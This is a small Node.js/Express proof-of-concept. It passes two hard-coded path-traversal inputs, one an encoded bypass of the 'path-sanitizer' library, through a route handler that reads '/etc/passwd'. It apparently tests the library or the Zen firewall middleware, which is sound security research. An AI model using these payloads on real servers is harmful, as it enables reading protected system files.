const Zen = require("@aikidosec/firewall");
const sanitize = require("path-sanitizer")
const path = require("path")
const fs = require("fs")
const express = require('express')
const app = express()
const port = 3000

Zen.addExpressMiddleware(app);

// Real scenario:
function routeHandler(myPath) {
  // Lets just assume that the path was extracted from the request
  // We want to read a file in the C:\Users\user\Desktop\myApp\ directory
  // But the user should be able to access C:\Users\user\Desktop\
  // So we need to sanitize the path

  const APP_DIR = "/home/test"
  const sanitized = path.join(APP_DIR, sanitize(myPath))

  // Now we would usally read the file
  // But in this case we just gonna print the path
  console.log(sanitized)

  return sanitized
}

function readFile(filePath) {
  const absolutePath = path.resolve(filePath) // Resolve to absolute path

  fs.readFile(absolutePath, "utf8", (err, data) => {
    if (err) {
      console.error(`Error reading the file: ${err.message}`)
      return
    }
    console.log(`Contents of the file ${filePath} :\n${data}`)
  })
}

input_user_bypass = "..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5cetc/passwd"
input_user_payload = "../../../../../../../../etc/passwd"

app.get('/', (req, res) => {
  readFile(routeHandler(input_user_bypass))
  readFile(routeHandler(input_user_payload))
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
